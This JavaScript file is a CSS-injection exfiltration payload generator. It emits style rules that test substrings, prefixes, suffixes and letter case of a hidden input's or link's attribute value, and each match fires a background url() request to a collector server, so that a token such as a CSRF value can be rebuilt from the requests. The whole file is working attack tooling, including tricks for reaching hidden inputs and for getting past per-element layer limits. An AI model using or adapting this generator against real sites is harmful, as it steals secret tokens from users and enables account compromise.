// CSS payload generator. Loaded by public/index.html in the browser and
// required by the tests in Node so both exercise the same code.
//
// For every possible hex window of `windowSize` chars, one rule fires a request
// if the attribute contains it. Two smaller rule sets leak the first and last
// ANCHOR_LENGTH chars of the token so the solver knows where it starts and
// ends. Each rule sets its own custom property to a url(), and a single
// `background` lists them all, so every matching rule becomes one request:
//
//   GET /abcd    the attribute contains "abcd"
//   GET /s/ab    the token starts with "ab"
//   GET /e/ab    the token ends with "ab"
//
// Non-hex charsets (alphanumeric, base64, base64url) have too many mixed-case
// windows to probe directly (62^3 = 238k), so they use two smaller sets:
// case-insensitive windows over the lowercased alphabet (`[href*=abc i]`,
// 36^3 = 47k) recover the token in lowercase, and case-sensitive 2-char
// windows containing a letter recover each letter's case:
//
//   GET /c/aB    the attribute contains "aB" (case-sensitive)
//
// A "/" in a leaked chunk is sent as %2F so it stays one path segment.
(function (root) {
  const HEX = '0123456789abcdef';
  const DIGITS = '0123456789';
  const LOWER = 'abcdefghijklmnopqrstuvwxyz';
  const UPPER = LOWER.toUpperCase();
  // fold: the case-insensitive alphabet the windows are built from. cased:
  // letters can be either case (so case pairs are probed). windows: the
  // window sizes offered, default first.
  const CHARSETS = {
    hex: { fold: HEX, cased: false, windows: [4, 3] },
    alnum: { fold: DIGITS + LOWER, cased: true, windows: [3] },
    base64: { fold: DIGITS + LOWER + '+/=', cased: true, windows: [3] },
    base64url: { fold: DIGITS + LOWER + '-_', cased: true, windows: [3] },
  };
  const ANCHOR_LENGTH = 2;
  const MAX_LAYERS_PER_BOX = 25000;
  const PSEUDO_BOXES = ['::before', '::after'];
  const NAME_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';

  function shortName(index) {
    // The leading -- makes digits valid too; custom properties are case-sensitive.
    let name = '';
    do {
      name = NAME_CHARS[index % NAME_CHARS.length] + name;
      index = Math.floor(index / NAME_CHARS.length) - 1;
    } while (index >= 0);
    return name;
  }

  function attributeValue(value) {
    if (/^(?:--|-?[A-Za-z_])[A-Za-z0-9_-]*$/.test(value)) return value;
    const quoted = '"' + value.replace(/["\\\n\r\f\0]/g, c => {
      if (c === '\0') return '\ufffd';
      return /[\n\r\f]/.test(c) ? '\\' + c.charCodeAt(0).toString(16) + ' ' : '\\' + c;
    }) + '"';
    // An escaped punctuation mark costs one byte, versus two quote marks.
    // Keep numeric starts and control characters quoted; their identifier
    // escapes are longer and can consume following hex digits.
    if (!value || /^(?:[0-9]|-[0-9])/.test(value) || /[^\x21-\x7e]/.test(value)) return quoted;
    const ident = value.replace(/[^A-Za-z0-9_-]/g, '\\$&');
    return ident.length < quoted.length ? (ident === '-' ? '\\-' : ident) : quoted;
  }

  function collectorURL(server) {
    // Keep the abbreviation literal: URL serialization expands it to 127.0.0.1.
    // Keep localhost: it can resolve to IPv6 and is a different origin for
    // CSP. HTTPS names must remain intact for certificate validation too.
    return server.replace(/^http:\/\/127\.0\.0\.1(?=[:/]|$)/i, 'http://127.1');
  }

  function backgroundList(props) {
    // Matching values carry their own commas. Missing props contribute no layer.
    return props.map(p => `var(--${p},)`).join('') + 'none';
  }

  function allWindows(alphabet, length) {
    const chars = [...alphabet];
    let out = [''];
    for (let i = 0; i < length; i++) {
      const next = [];
      for (const prefix of out) for (const c of chars) next.push(prefix + c);
      out = next;
    }
    return out;
  }

  const allHex = length => allWindows(HEX, length);

  const charsetOf = name => CHARSETS[Object.hasOwn(CHARSETS, name || '') ? name : 'hex'];
  const charsetName = name => (Object.hasOwn(CHARSETS, name || '') ? name : 'hex');
  const windowSizeFor = (charset, size) => {
    const { windows } = charsetOf(charset);
    return windows.includes(Number(size)) ? Number(size) : windows[0];
  };
  // Every char a token in this charset can contain.
  const alphabetOf = cs => (cs.cased ? cs.fold + UPPER : cs.fold);
  const isLetter = c => (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');

  // The case-sensitive 2-char windows probed for a cased charset: every pair
  // over the full alphabet that contains a letter (others carry no case).
  function caseBigrams(cs) {
    if (!cs.cased) return [];
    return allWindows(alphabetOf(cs), 2).filter(p => isLetter(p[0]) || isLetter(p[1]));
  }

  // Count pairs without constructing thousands of strings just to size a
  // payload or check whether another field fits on a host.
  function caseBigramCount(cs) {
    if (!cs.cased) return 0;
    const alphabet = alphabetOf(cs);
    const nonletters = [...alphabet].filter(c => !isLetter(c)).length;
    return alphabet.length ** 2 - nonletters ** 2;
  }

  // Known text's lowercased windows that the payload would leak, and its case
  // pairs: the solver treats both as expected leftovers rather than token.
  function foldWindows(str, cs, k) {
    const out = new Set();
    const s = cs.cased ? str.toLowerCase() : str;
    for (let i = 0; i + k <= s.length; i++) {
      const w = s.slice(i, i + k);
      if ([...w].every(c => cs.fold.includes(c))) out.add(w);
    }
    return out;
  }
  function caseBigramsIn(str, cs) {
    const out = new Set();
    if (!cs.cased) return out;
    const alphabet = alphabetOf(cs);
    for (let i = 0; i + 2 <= str.length; i++) {
      const p = str.slice(i, i + 2);
      if (alphabet.includes(p[0]) && alphabet.includes(p[1]) && (isLetter(p[0]) || isLetter(p[1]))) out.add(p);
    }
    return out;
  }

  // A leaked chunk as a URL path segment.
  const pathChunk = c => c.replace(/\//g, '%2F');

  // One attribute test, optionally ASCII case-insensitive.
  function attributeTest(attr, op, value, ci) {
    const v = attributeValue(value);
    // ASCII case folding cannot change a value containing no letters.
    ci = ci && /[a-z]/i.test(value);
    return `[${attr}${op}${v}${ci ? (v.startsWith('"') ? 'i' : ' i') : ''}]`;
  }

  // How many probe rules (and layers) generateCSS emits.
  function ruleCount(cfg) {
    const cs = charsetOf(cfg.charset);
    const k = windowSizeFor(cfg.charset, cfg.windowSize);
    return cs.fold.length ** k + 2 * cs.fold.length ** ANCHOR_LENGTH + caseBigramCount(cs);
  }

  function generateCSS(cfg, server) {
    server = collectorURL(server);
    const { selector, attribute, tag, startContext, endContext, useStartsWith, useEndsWith } = cfg;
    const cs = charsetOf(cfg.charset);
    const windowSize = windowSizeFor(cfg.charset, cfg.windowSize || 4);
    const ci = cs.cased;
    // A hidden input can't render its own background, so its requests need
    // another element. Two ways to reach one:
    //   :has() (default): the root, via `html:has(&[...])`. Immune to a hidden
    //     sibling, at the cost of a `html:has()` test per rule.
    //   sibling: the next sibling, via `&[...]+*`. Cheaper, but breaks if the
    //     input is followed by another non-rendering element.
    // Anchors render themselves, so hostMode is ignored for them.
    const useHas = tag === 'input' && cfg.hostMode === 'has';
    // For hidden inputs in sibling mode the requests are made by the next sibling.
    const target = !useHas && tag === 'input' ? '+*' : '';
    const rules = [];
    const layers = [];
    const rule = (op, value, prop, type, chunk, caseless = ci) => {
      const match = attributeTest(attribute, op, value, caseless);
      const subject = useHas ? `html:has(&${match})` : `&${match}${target}`;
      rules.push(`${subject}{--${prop}:url(${server}/${type}${pathChunk(chunk)}),}`);
    };

    // Start/end props contain a hyphen, so they can never clash with a
    // shortName() (alphanumeric/underscore) used for the window props.
    const anchors = allWindows(cs.fold, ANCHOR_LENGTH);
    for (const a of anchors) {
      if (useStartsWith) rule('^=', a, 's-', 's/', a);
      else rule('*=', startContext + a, 's-', 's/', a);
    }
    let n = 0;
    for (const w of allWindows(cs.fold, windowSize)) {
      const prop = shortName(n++);
      rule('*=', w, prop, '', w);
      layers.push(prop);
    }
    // Case pairs are matched case-sensitively (the HTML default for href,
    // value, content and data-* attributes).
    for (const p of caseBigrams(cs)) {
      const prop = shortName(n++);
      rule('*=', p, prop, 'c/', p, false);
      layers.push(prop);
    }
    for (const a of anchors) {
      if (useEndsWith) rule('$=', a, 'e-', 'e/', a);
      else rule('*=', a + endContext, 'e-', 'e/', a);
    }

    // Keep the existing per-box limits even though unmatched probes now vanish.
    // Custom properties are inherited by the pseudo-elements.
    const all = ['s-', ...layers, 'e-'];
    const boxCount = Math.ceil(all.length / MAX_LAYERS_PER_BOX);
    const perBox = Math.ceil(all.length / boxCount);
    // In :has() mode the root hosts the layers (html:has(&) is <html> whenever
    // the input exists); otherwise the next sibling (input) or the element
    // itself (anchor) does.
    const host = useHas ? 'html:has(&)' : (tag === 'input' ? '&+*' : '&');
    let body = '';
    for (let i = 0; i < boxCount; i++) {
      const background = `background:${backgroundList(all.slice(i * perBox, (i + 1) * perBox))}`;
      if (i === 0) {
        if (useHas) body += `${host}{${background}}`;
        else body += tag === 'input' ? `${host}{display:inline-block;${background}}` : background + ';';
      } else body += `${host}${PSEUDO_BOXES[i - 1]}{content:"";display:inline-block;${background}}`;
    }
    return `<style>${selector}{${rules.join('')}${body}}</style>`;
  }

  const api = {
    HEX, CHARSETS, ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES,
    shortName, attributeValue, attributeTest, collectorURL, backgroundList, allHex, allWindows,
    charsetOf, charsetName, windowSizeFor, alphabetOf, isLetter, caseBigrams, caseBigramCount, foldWindows, caseBigramsIn,
    pathChunk, ruleCount, generateCSS,
  };
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else Object.assign(root, api);
})(typeof window !== 'undefined' ? window : globalThis);
